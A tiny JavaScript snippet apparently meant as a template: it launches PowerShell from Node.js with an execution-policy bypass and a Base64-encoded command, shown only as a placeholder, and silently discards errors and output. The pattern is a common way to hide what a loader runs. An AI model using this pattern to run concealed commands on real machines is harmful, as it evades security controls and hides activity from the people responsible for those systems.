const { exec } = require("child_process");
exec("powershell -exec bypass -EncodedCommand Base64EncodedPowerShellCommand", (error, stdout, stderr) => {
    if (error) {
        
        return;
    }
    if (stderr) {
        
        return;
    }
    
});	
